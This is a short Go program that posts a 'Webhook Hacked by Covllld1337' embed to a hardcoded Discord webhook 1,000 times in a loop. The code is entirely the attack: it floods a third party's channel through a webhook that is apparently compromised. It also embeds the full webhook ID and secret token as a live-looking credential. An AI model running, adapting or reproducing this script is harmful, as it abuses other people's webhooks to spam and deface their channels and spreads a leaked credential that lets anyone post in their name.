package main

import (
	"bytes"
	"fmt"
	"net/http"
)

func main() {
	for compteur := 0; compteur < 1000; compteur++ {
		webhookURL := "https://ptb.discord.com/api/webhooks/1319836335443542168/FykPhZRdaJDAD8wyhMtX0ZhfYb_WbSEWiPqYJTJtMFE4sUIUcL0ns7vdhtxfCXVsgWGG"
		message := `{
			"embeds": [
				{
					"title": "🚨 Webhook Hacked 🚨",
					"description": "Webhook hacked by Covllld1337",
					"color": 16711680,
					"fields": [
						{
							"name": "⚠️ Alerte",
							"value": "Ce webhook a été compromis. Récupérez le contrôle immédiatement !"
						},
						{
							"name": "🔒 Sécurisez votre webhook",
							"value": "Deleted."
						}
					],
					"footer": {
						"text": "Covllld1337 |",
						"icon_url": "https://avatars.githubusercontent.com/u/171270023?v=4"
					},
					"timestamp": "2024-12-24T00:00:00Z"
				}
			]
		}`
		resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer([]byte(message)))
		if err != nil {
			fmt.Println("Erreur lors de l'envoi du message:", err)
			return
		}
		defer resp.Body.Close()
		fmt.Println("Message envoyé avec succès ! Status code:", resp.Status)

	}
}
